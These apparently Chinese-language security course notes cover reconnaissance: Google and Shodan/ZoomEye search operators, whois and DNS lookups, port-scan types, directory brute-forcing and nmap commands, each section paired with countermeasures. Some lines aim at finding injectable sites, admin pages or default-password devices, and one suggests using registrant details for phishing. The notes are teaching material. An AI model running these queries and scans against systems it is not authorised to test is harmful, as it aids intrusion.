<h6 id="10-3-1-4-1-1-Google-Hacking"><a href="#10-3-1-4-1-1-Google-Hacking" class="headerlink" title="10.3.1.4.1.1. Google Hacking"></a>10.3.1.4.1.1. Google Hacking</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#site</span><br><span class="line">功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。</span><br><span class="line">site:zhihu.com				搜索跟zhihu.com相关的网页</span><br><span class="line">&quot;web安全&quot; site:zhihu.com		搜索zhihu.com跟web安全相关的内容</span><br><span class="line">&quot;sql注入&quot; site:csdn.net		在csdn.net搜索跟SQL注入相关的内容</span><br><span class="line">&quot;教程&quot; site:pan.baidu.com		在百度盘搜索教程</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#filetype</span><br><span class="line">功能：搜索指定文件类型</span><br><span class="line">&quot;web安全&quot; filetype:pdf		搜索跟web安全有关的pdf文件</span><br><span class="line">namp filetype:ppt			搜索跟nmap相关的ppt文件</span><br><span class="line">site:csdn.net filetype:pdf	搜索csdn网站中的pdf文件</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#inurl</span><br><span class="line">功能：搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站</span><br><span class="line">inurl:.php?id=				搜索网址中有&quot;.php?id=&quot;的网页</span><br><span class="line">inurl:view.php=?			搜索网址中有&quot;view.php=?&quot;的网页</span><br><span class="line">inurl:.jsp?id=				搜索网址中有&quot;.jsp?id=&quot;的网页</span><br><span class="line">inurl:.asp?id=				搜索网址中有&quot;.asp?id=&quot;的网页</span><br><span class="line">inurl:/admin/login.php		搜索网址中有&quot;/admin/login.php&quot;的网页</span><br><span class="line">inurl:login					搜索网址中有&quot;login&quot;的登录网页</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#intitle</span><br><span class="line">功能：搜索标题存在特点关键字的网页</span><br><span class="line">intitle:后台登录								搜索网页标题是&quot;后台登录&quot;的网页</span><br><span class="line">intitle:后台管理 filetype:php					搜索网页标题是&quot;后台管理&quot;的php页面</span><br><span class="line">intitle:index of &quot;parent directory&quot;		   	   搜索根目录相关的索引目录信息</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#intext</span><br><span class="line">功能：搜索正文存在特定关键字的网页</span><br><span class="line">intext:powered by Discuz			搜索Discuz论坛相关的页面</span><br><span class="line">intext:powered by wordpress			搜索wordpress制作的博客网址</span><br><span class="line">intext:powered by *CMS				搜索基于*CMS的网址，CMS是内容管理系统，建站系统</span><br><span class="line">intext:powered by xxx inurl:login	搜索此类网址的后台登录页面	</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#符号</span><br><span class="line">-keyword		强制结果不要出现此关键字，例如：电影 -黑客</span><br><span class="line">*keyword		模糊搜索，强制结果包含此关键字，例如：电影 一个叫*决定*</span><br><span class="line">&quot;keyword&quot;		强制搜索结果整体出现此关键字，例如：书籍 &quot;web安全&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#快捷键</span><br><span class="line">Ctrl + F		想要在页面中查找某关键字的位置</span><br><span class="line">Ctrl + +/-/0	放大、缩小页面，0是回到100%</span><br><span class="line">Ctrl + L		选中页面中的地址栏</span><br><span class="line">Ctrl + Tab		切换标签页</span><br><span class="line">Alt + Tab		切换窗口</span><br></pre></td></tr></table></figure>
<p>例：搜纽约时报网站(nytimes.com)在2008年到2010年关于大学(college)测验分数(test scores)但不是SAT入学分数的文章。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:nytimes.com ~college &quot;test scores&quot; -SATs 2008..2010</span><br><span class="line">site:nytimes.com	//只搜索某个网站的页面</span><br><span class="line">~college			//同时搜索近义词比如university,higher education</span><br><span class="line">&quot;test scores&quot;		//整体作为关键词</span><br><span class="line">-SATs				//排除SATs</span><br><span class="line">2008..2010			//显示指定年份时间段内的搜索结果</span><br></pre></td></tr></table></figure>
<h6 id="10-3-1-4-2-Shodan-Hacking"><a href="#10-3-1-4-2-Shodan-Hacking" class="headerlink" title="10.3.1.4.2. Shodan Hacking"></a>10.3.1.4.2. Shodan Hacking</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.shodan.io</span><br><span class="line">Shodan(撒旦搜索引擎)被称为“最可怕的搜索引擎”，可扫描一切联网的设备。除了常见的web服务器，还能扫描防火墙、路由器、交换机、摄像头、打印机等一切联网设备。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ip</span><br><span class="line">114.114.114.114</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#service/protocol</span><br><span class="line">http</span><br><span class="line">http country:&quot;DE&quot;		使用高级搜索要注册登录才能搜索</span><br><span class="line">http product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line">ssh</span><br><span class="line">ssh default password</span><br><span class="line">ssh default password country:&quot;JP&quot; city:&quot;Tokyo&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#keyword</span><br><span class="line">基于关键词搜索的思路是根据banner(设备指纹)来搜索</span><br><span class="line">&quot;default password&quot; country:&quot;TH&quot;</span><br><span class="line">FTP anon successful</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#product</span><br><span class="line">product:&quot;Microsoft IIS httpd&quot;</span><br><span class="line">product:&quot;nginx&quot;</span><br><span class="line">product:&quot;Apache httpd&quot;</span><br><span class="line">product:MySQL</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#version</span><br><span class="line">product:MySQL version:&quot;5.1.73&quot;</span><br><span class="line">product:&quot;Microsoft IIS httpd&quot; version:&quot;7.5&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#hostname</span><br><span class="line">hostname:.org</span><br><span class="line">hostname:.edu</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#os</span><br><span class="line">os:&quot;Windows Server 2008 R2&quot;</span><br><span class="line">os:&quot;Windows 7 or 8&quot;</span><br><span class="line">os:&quot;Linux 2.6.x&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#net</span><br><span class="line">net:110.180.13.0/24</span><br><span class="line">200 ok net:110.180.13.0/24</span><br><span class="line">200 ok country:JP net:110.180.13.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#port</span><br><span class="line">port:3389</span><br><span class="line">port:445</span><br><span class="line">port:22</span><br></pre></td></tr></table></figure>
<p>远程桌面连接mstsc，好像要Win10专业版才行。</p>
<h6 id="10-3-1-4-3-Zoomeye-Hacking"><a href="#10-3-1-4-3-Zoomeye-Hacking" class="headerlink" title="10.3.1.4.3. Zoomeye Hacking"></a>10.3.1.4.3. Zoomeye Hacking</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://www.zoomeye.org</span><br><span class="line">ZoomEye(钟馗之眼)是一个面向网络空间的搜索引擎，“国产的shodan”。</span><br><span class="line"></span><br><span class="line">ip			ip:35.185.77.2</span><br><span class="line">os			os:linux</span><br><span class="line">app			app:Apache httpd</span><br><span class="line">service		service:routersetup	公网路由器</span><br><span class="line">port		port:3389</span><br><span class="line">country		country:cn</span><br><span class="line">city		country:cn +city:hangzhou</span><br><span class="line">ver			app:Apache httpd +ver:2.2.16</span><br><span class="line">cidr		cidr:35.185.77.2/24		IP的CIDR网段</span><br><span class="line">hostname	hostname:google.com	</span><br><span class="line">site</span><br><span class="line">title</span><br><span class="line">header</span><br><span class="line">keywords</span><br><span class="line">desc</span><br><span class="line"></span><br><span class="line">用户手册：https://www.zoomeye.org/help</span><br></pre></td></tr></table></figure>
<h6 id="10-3-1-4-1-4-元搜索引擎"><a href="#10-3-1-4-1-4-元搜索引擎" class="headerlink" title="10.3.1.4.1.4 元搜索引擎"></a>10.3.1.4.1.4 元搜索引擎</h6><p>集成多个搜索引擎进行信息收集</p>
<p>基于元搜索引擎实现被篡改网站发现</p>

<h6 id="10-3-1-4-1-5-防范措施"><a href="#10-3-1-4-1-5-防范措施" class="headerlink" title="10.3.1.4.1.5 防范措施"></a>10.3.1.4.1.5 防范措施</h6><ul>
<li>注意组织安全敏感信息以及个人隐私信息不要在因特网上随意发布</li>
<li>个人上网时尽量保持匿名</li>
<li>提供个人隐私信息时，应选择具有良好声誉并可信任的网站</li>
<li>定期对自身单位及个人在Web上的信息足迹进行搜索</li>
</ul>
<h5 id="10-3-1-4-2-DNS与IP查询"><a href="#10-3-1-4-2-DNS与IP查询" class="headerlink" title="10.3.1.4.2 DNS与IP查询"></a>10.3.1.4.2 DNS与IP查询</h5><h6 id="10-3-1-4-2-1-Whois查询"><a href="#10-3-1-4-2-1-Whois查询" class="headerlink" title="10.3.1.4.2.1 Whois查询"></a>10.3.1.4.2.1 Whois查询</h6><p>whois是用来查询域名注册所有者等信息的传输协议。</p>
<p>通过 whois 来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS 解析服务器、注册人联系电话等等，可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。</p>
<p><a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
<h6 id="10-3-1-4-2-2-备案信息"><a href="#10-3-1-4-2-2-备案信息" class="headerlink" title="10.3.1.4.2.2 备案信息"></a>10.3.1.4.2.2 备案信息</h6><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等）。</p>
<p>利用技巧：</p>
<ul>
<li>DNS解析记录可以反查 IP，比较早的解析记录有时可以查到真实 IP，需要留意一下。</li>
<li>注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
<h6 id="10-3-1-4-2-3-DNS服务：从DNS到IP的映射"><a href="#10-3-1-4-2-3-DNS服务：从DNS到IP的映射" class="headerlink" title="10.3.1.4.2.3 DNS服务：从DNS到IP的映射"></a>10.3.1.4.2.3 DNS服务：从DNS到IP的映射</h6><p>先了解一下域名层级：以百度为例子：www.baidu.com。依次是com(顶级域名)、baidu(一级域名)、www(二级域名)。但是实质上还有一个唯一的根域名root：www.baidu.com.root，但由于root是唯一的，因此是否写root根域名不是特别必要。</p>
<p>DNS查询工具：</p>
<p>系统自带：nslookup(Windows)、dig(Linux)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup www.gzhu.edu.cn</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  202.192.18.10</span><br><span class="line"></span><br><span class="line">名称:    gzhu-edu-cn.cname.saaswaf.com</span><br><span class="line">Addresses:  2001:250:100d:ffac:121:194:14:82</span><br><span class="line">          2001:250:100d:ffac:121:194:14:83</span><br><span class="line">          2001:da8:2032:1006:10:0:213:50</span><br><span class="line">          2001:da8:2032:1006:10:0:213:51</span><br><span class="line">          58.205.213.52</span><br><span class="line">          121.194.14.85</span><br><span class="line">          121.194.14.84</span><br><span class="line">Aliases:  www.gzhu.edu.cn</span><br></pre></td></tr></table></figure>
<h6 id="10-3-1-4-2-4-IP-gt-location查询"><a href="#10-3-1-4-2-4-IP-gt-location查询" class="headerlink" title="10.3.1.4.2.4 IP-&gt;location查询"></a>10.3.1.4.2.4 IP-&gt;location查询</h6><p>IP地址到现实世界中的具体地理位置。</p>
<p>域名-&gt;IP地址-&gt;地理位置</p>
<p><a target="_blank" rel="noopener" href="https://cz88.net/">https://cz88.net/</a></p>
<h6 id="10-3-1-4-2-5-防范措施"><a href="#10-3-1-4-2-5-防范措施" class="headerlink" title="10.3.1.4.2.5 防范措施"></a>10.3.1.4.2.5 防范措施</h6><ul>
<li><p>公用数据库中提供信息的安全问题</p>
<ul>
<li>必须向注册机构提供尽可能准确的信息</li>
</ul>
</li>
<li><p>采用一些安防措施不让攻击者轻易得手</p>
<ul>
<li><p>及时更新管理性事务联系人的信息</p>
</li>
<li><p>尝试使用虚构的人名来作为管理性事务联系人</p>
<p>HoneyMan：帮助发现和追查那些在电话或邮件中试图冒充虚构人名的“社会工程师”。</p>
</li>
<li><p>慎重考虑所列的电话号码和地址等信息</p>
</li>
<li><p>注意域名注册机构允许更新注册信息的方式，并确保其中关键信息的安全</p>
</li>
</ul>
</li>
</ul>
<h5 id="10-3-1-4-3-网络侦察"><a href="#10-3-1-4-3-网络侦察" class="headerlink" title="10.3.1.4.3 网络侦察"></a>10.3.1.4.3 网络侦察</h5><h6 id="10-3-1-4-3-1-Traceroute路由追踪"><a href="#10-3-1-4-3-1-Traceroute路由追踪" class="headerlink" title="10.3.1.4.3.1 Traceroute路由追踪"></a>10.3.1.4.3.1 Traceroute路由追踪</h6><ul>
<li>探测网络路由路径，可用于确定网络拓扑</li>
<li>主机发送TTL从1开始逐步增1的IP包，网络路径上路由器返回ICMP TIME_EXECEEDED</li>
<li>UNIX/Linux: traceroute<br>Windows: tracert</li>
<li>穿透防火墙: traceroute-S -p53 TARGET_IP</li>
<li>图形化界面工具: VisualRoute, NeoTrace, Trout</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;tracert www.gzhu.edu.cn</span><br><span class="line"></span><br><span class="line">通过最多 30 个跃点跟踪</span><br><span class="line">到 gzhu-edu-cn.cname.saaswaf.com [121.194.14.84] 的路由:</span><br><span class="line"></span><br><span class="line">  1     9 ms    13 ms     8 ms  172.29.255.254</span><br><span class="line">  2     *        *        *     请求超时。</span><br><span class="line">  3     *        *        *     请求超时。</span><br><span class="line">  4     *        *        *     请求超时。</span><br><span class="line">  5    12 ms     6 ms    11 ms  scn-rgw8.gznet.edu.cn [202.112.19.85]</span><br><span class="line">  6     6 ms    11 ms     8 ms  101.4.114.62</span><br><span class="line">  7     *        *        *     请求超时。</span><br><span class="line">  8     *        *        *     请求超时。</span><br><span class="line">  9     *        *        *     请求超时。</span><br><span class="line"> 10     *        *        *     请求超时。</span><br><span class="line"> 11     *        *        *     请求超时。</span><br><span class="line"> 12    62 ms    57 ms    67 ms  101.4.117.177</span><br><span class="line"> 13    60 ms    60 ms    58 ms  202.200.28.186</span><br><span class="line"> 14    59 ms    56 ms    57 ms  121.194.14.84</span><br><span class="line"></span><br><span class="line">跟踪完成。</span><br></pre></td></tr></table></figure>
<h3 id="10-3-2-网络扫描技术"><a href="#10-3-2-网络扫描技术" class="headerlink" title="10.3.2 网络扫描技术"></a>10.3.2 网络扫描技术</h3><div class="table-container">
<table>
<thead>
<tr>
<th>网络扫描类型</th>
<th>网络扫描目的</th>
</tr>
</thead>
<tbody>
<tr>
<td>主机扫描</td>
<td>找出网段内活跃主机</td>
</tr>
<tr>
<td>端口扫描</td>
<td>找出主机上所开放的网络服务</td>
</tr>
<tr>
<td>操作系统/网络服务辨识</td>
<td>识别主机安装的操作系统类型与开放网络服务类型，以选择不同渗透攻击代码及配置</td>
</tr>
<tr>
<td>漏洞扫描</td>
<td>找出主机/网络服务上所存在的安全漏洞，作为渗透点</td>
</tr>
</tbody>
</table>
</div>
<h4 id="10-3-2-1-主机扫描-Ping扫描"><a href="#10-3-2-1-主机扫描-Ping扫描" class="headerlink" title="10.3.2.1 主机扫描(Ping扫描)"></a>10.3.2.1 主机扫描(Ping扫描)</h4><p>主机扫描目的：检查目标主机是否活跃</p>
<p>主机扫描方式：</p>
<ul>
<li>传统ICMP Ping扫描</li>
<li>ACK Ping扫描</li>
<li>SYN Ping扫描</li>
<li>UDP Ping扫描：到关闭端口</li>
</ul>
<p>主机扫描程序：</p>
<ul>
<li>Ping</li>
<li>Nmap：-sP选项，缺省执行，集合了以上几种扫描方式</li>
</ul>
<p>Ping扫射：同时扫描大量地IP地址段，以发现某个IP地址是否绑定活跃主机的扫描。</p>
<p>主机扫描防范措施：</p>
<p>单一主机Ping扫描很常见，危害性也不大，更关注Ping扫射。</p>
<p>监测：网络入侵检测系统Snort；主机扫描监测工具Scanlogd</p>
<p>防御：仔细考虑对ICMP通信的过滤策略<br>利用Ping构建后门: loki(Phrackv51#06), pingd</p>
<h4 id="10-3-2-2-端口扫描"><a href="#10-3-2-2-端口扫描" class="headerlink" title="10.3.2.2 端口扫描"></a>10.3.2.2 端口扫描</h4><p>端口：TCP/UDP(1-64K)，运行网络应用服务</p>
<p>端口分类：</p>
<ol>
<li>知名端口0-1023(Well_Known Ports)</li>
</ol>
<ul>
<li>80/TCPHTTP(超文本传输协议)：用于传输网页</li>
<li>81/TCPHTTP预备(超文本传输协议)</li>
<li>443/TCPHTTPS(超文本安全传输协议)</li>
</ul>
<ol>
<li>注册端口为1024-49151(Registered Ports)</li>
</ol>
<ul>
<li>4433/tcp, udp             Microsoft SQL database system </li>
<li>1434/tcp, udp             Microsoft SQL Monitor</li>
</ul>
<ol>
<li>动态端口或私有端口为49152-65535(Dynamic Ports)</li>
</ol>
<ul>
<li>这些端口号一般不固定分配给某个服务，只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。</li>
</ul>
<p>连接目标主机的TCP和UDP端口，确定哪些服务正在运行即处于监听状态的过程。</p>
<p>端口扫描目的：</p>
<ul>
<li>防御者－更加了解所管理的网络状况，找出没有必要开放的端口并关闭，这是保证业务网络安全的第一步。</li>
<li>攻击者－找出可供进一步攻击的网络服务，同时结合操作系统探测技术也可以确定目标主机所安装的操作系统版本。开放网络服务和操作系统版本信息为攻击者提供了破解攻击的目标，使其更容易找出进入目标主机的漏洞路径。</li>
</ul>
<h5 id="10-3-2-2-1-TCP连接扫描"><a href="#10-3-2-2-1-TCP连接扫描" class="headerlink" title="10.3.2.2.1 TCP连接扫描"></a>10.3.2.2.1 TCP连接扫描</h5><ul>
<li>调用connect() socket函数连接目标端口</li>
<li>开放端口：完成完整的TCP三次握手(SYN, SYN|ACK, ACK)，timeout/RST</li>
<li>关闭端口：SYN, RST</li>
<li>优势&amp;弱势：无需特权用户权限可发起，目标主机记录大量连接和错误信息，容易检测</li>
</ul>

<h5 id="10-3-2-2-2-SYN扫描"><a href="#10-3-2-2-2-SYN扫描" class="headerlink" title="10.3.2.2.2 SYN扫描"></a>10.3.2.2.2 SYN扫描</h5><ul>
<li>半开扫描(half-open scanning)</li>
<li>开放端口：攻击者SYN, 目标主机SYN|ACK, 攻击者立即反馈RST包关闭连接</li>
<li>关闭端口：攻击者SYN, 目标主机RST</li>
<li>优势&amp;弱势：目标主机不会记录未建立连接，较为隐蔽，需根用户权限构建定制SYN包</li>
</ul>

<h5 id="10-3-2-2-3-隐蔽端口扫描"><a href="#10-3-2-2-3-隐蔽端口扫描" class="headerlink" title="10.3.2.2.3 隐蔽端口扫描"></a>10.3.2.2.3 隐蔽端口扫描</h5><p>TCP连接扫描和SYN扫描并不隐蔽：防火墙会监控发往受限端口的SYN包。</p>
<p>隐蔽端口扫描通过构造特殊的TCP标志位，以躲避检测，同时达成端口扫描目的。</p>
<p>FIN扫描(只带FIN位), Null扫描(全为0), XMAS扫描(FIN/URG/PUSH)<br>FTP弹射扫描：利用FTP代理选项达到隐蔽源地址</p>
<ul>
<li>开放端口：标准TCP协议规范，接受这些伪造TCP包，丢弃，无任何反馈</li>
<li>关闭端口：反馈RST包</li>
</ul>
<p>Windows/Cisco等系统没有遵从规范，开放端口对于伪造TCP包也反馈RST，以上这三种方法不适用。</p>
<h5 id="10-3-2-2-4-UDP端口扫描"><a href="#10-3-2-2-4-UDP端口扫描" class="headerlink" title="10.3.2.2.4 UDP端口扫描"></a>10.3.2.2.4 UDP端口扫描</h5><ul>
<li>对目标端口发送特殊定制的UDP数据报文</li>
<li>开放端口: UDP反馈</li>
<li>关闭端口: ICMP port unreachable报文</li>
</ul>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU</span><br></pre></td></tr></table></figure>
<h5 id="10-3-2-2-5-防范措施"><a href="#10-3-2-2-5-防范措施" class="headerlink" title="10.3.2.2.5 防范措施"></a>10.3.2.2.5 防范措施</h5><ul>
<li><p>任何攻击技术都是双刃剑</p>
<p>网络管理员也可利用端口扫描确定开放必要服务</p>
</li>
<li><p>端口扫描的监测<br>网络入侵检测系统: Snort中的portscan检测插件<br>系统扫描检测工具: scanlogd, PortSentry, Genius</p>
</li>
<li><p>端口扫描的预防</p>
<ul>
<li>开启防火墙<br>类UNIX: netfilter/IPTables, Win32: 个人防火墙</li>
<li>禁用所有不必要的服务,尽可能减少暴露面(进一步的受攻击面)<br>类UNIX: /etc/inetd.conf，Win32: 控制面板/服务</li>
</ul>
</li>
</ul>
<h5 id="10-3-2-2-6-目录扫描"><a href="#10-3-2-2-6-目录扫描" class="headerlink" title="10.3.2.2.6 目录扫描"></a>10.3.2.2.6 目录扫描</h5><p>目录扫描要有字典，相当于暴力破解，扫描是否有字典中的目录。kali下的目录扫描工具：dirb/dirsearch</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.137.146/mutillidae</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u www.XXX.com -e*(-e参数也可不指定语言，用*号表示所有语言)</span><br></pre></td></tr></table></figure>
<p>返回CODE:200才可以进去此目录。</p>
<h4 id="10-3-2-3-系统类型探查"><a href="#10-3-2-3-系统类型探查" class="headerlink" title="10.3.2.3 系统类型探查"></a>10.3.2.3 系统类型探查</h4><p>系统类型探查：探查活跃主机的系统及开放网络服务的类型</p>
<ol>
<li>目标主机上运行着何种类型什么版本的操作系统</li>
<li>各个开放端口上监听的是哪些网络服务</li>
</ol>
<p>目的：</p>
<ul>
<li>为更为深入的情报信息收集，真正实施攻击做好准备</li>
<li>如远程渗透攻击需了解目标操作系统类型与配置</li>
</ul>
<h5 id="10-3-2-3-1-操作系统类型探查"><a href="#10-3-2-3-1-操作系统类型探查" class="headerlink" title="10.3.2.3.1 操作系统类型探查"></a>10.3.2.3.1 操作系统类型探查</h5><p>通过各种不同操作系统类型和版本实现机制上的差异：</p>
<ul>
<li>协议栈实现差异－协议栈指纹鉴别</li>
<li>开放端口的差异－端口扫描</li>
<li>应用服务的差异－旗标攫取</li>
</ul>
<p>通过特定方法以确定目标主机所安装的操作系统类型和版本的技术手段。</p>
<p>明确操作系统类型和版本是进一步进行安全漏洞发现和渗透攻击的必要前提。</p>
<p>辨识方式：</p>
<p>–主动－操作系统主动探测技术</p>
<p>–被动－被动操作系统识别技术</p>
<h6 id="10-3-2-3-1-1-利用网络协议栈指纹识别OS"><a href="#10-3-2-3-1-1-利用网络协议栈指纹识别OS" class="headerlink" title="10.3.2.3.1.1 利用网络协议栈指纹识别OS"></a>10.3.2.3.1.1 利用网络协议栈指纹识别OS</h6><p>Ping中的TTL。TTL：生存时间</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>操作系统</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>LINUX</td>
<td>64</td>
</tr>
<tr>
<td>WIN2K/NT</td>
<td>128</td>
</tr>
<tr>
<td>WINDOWS系列</td>
<td>32</td>
</tr>
<tr>
<td>UNIX系列</td>
<td>255</td>
</tr>
</tbody>
</table>
</div>
<p>现实中的TTL值可能都不是以上数值，跟哪个接近就判断是哪个系统。</p>
<h5 id="10-3-2-3-2-网络服务类型探查"><a href="#10-3-2-3-2-网络服务类型探查" class="headerlink" title="10.3.2.3.2 网络服务类型探查"></a>10.3.2.3.2 网络服务类型探查</h5><p>确定目标网络中开放端口上绑定的网络应用服务类型和版本。</p>
<p>了解目标系统更丰富信息, 可支持进一步的操作系统辨识和漏洞识别。</p>
<p>网络服务主动探测：旗标抓取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV</span><br></pre></td></tr></table></figure>
<p>网络服务被动识别：特征匹配PADS</p>
<h5 id="10-3-2-3-3-防范措施"><a href="#10-3-2-3-3-防范措施" class="headerlink" title="10.3.2.3.3 防范措施"></a>10.3.2.3.3 防范措施</h5><p>并没有太多好办法。应立足于即使攻击者探查出了操作系统和网络服务类型，也不能轻易的攻破这道“坚固的防线”。</p>
<h4 id="10-3-2-4-Nmap"><a href="#10-3-2-4-Nmap" class="headerlink" title="10.3.2.4 Nmap"></a>10.3.2.4 Nmap</h4><p>nmap是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://nmap.org</span><br><span class="line">http://sectools.org</span><br></pre></td></tr></table></figure>
<p>扫描示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">主机发现		nmap -sn 192.168.137.144/24</span><br><span class="line">端口扫描		nmap -sS -p1-1000 192.168.137.144</span><br><span class="line">系统扫描		nmap -O 192.168.137.144</span><br><span class="line">网络服务扫描	   nmap -sV 192.168.137.144</span><br><span class="line">综合扫描		nmap -A 192.168.137.144</span><br><span 